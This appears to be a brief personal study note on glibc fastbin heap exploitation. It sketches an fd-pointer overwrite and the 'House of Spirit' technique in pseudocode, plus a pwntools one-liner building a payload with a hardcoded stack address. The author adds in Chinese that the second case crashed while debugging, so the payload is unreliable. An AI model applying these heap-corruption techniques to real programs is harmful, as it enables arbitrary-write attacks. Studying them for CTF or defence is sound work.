# reference
1. <http://www.freebuf.com/news/88660.html>

# analysis

```c
# case 1
p0 = malloc(32);
p1 = malloc(32);
free(p1);
free(p0);
p0 = malloc(32);
read(0,p0,0x60); //[1]overflow chunk p0 and change p1 fd (*(fd+8)=41)
p1 = malloc(32); //[2]set fake chunk into fastbinsY
p2 = malloc(32); //[3]p2 can points to anywhere setted in [1]

# case 2 House of Spirit
int *p = malloc(32);
char a[8];
read(0,a,0x60); //[1] overwrite *p pointed to fake chunk followed(need stack_addr)
free(p);        //[2]  set fake chunk into fastbinsY
p = malloc(32); //[3] p can points to anywhere setted in [1] 
// payload = '\x00'*8 + stack_addr + '\x01'*N*4 + '\x00'*4 + p32(0x29) + 'A'*32 + '\x00'*4 + p32(0x29)   
python -c "from pwn import *;print '\x00'*8 + p32(0xffffcf30)  + '\x00'*4 + p32(0x29)*15 + 'A'*32 + '\x00'*4 + p32(0x29) " > payload2
```
然而case 2调试的时候挂了 = =。

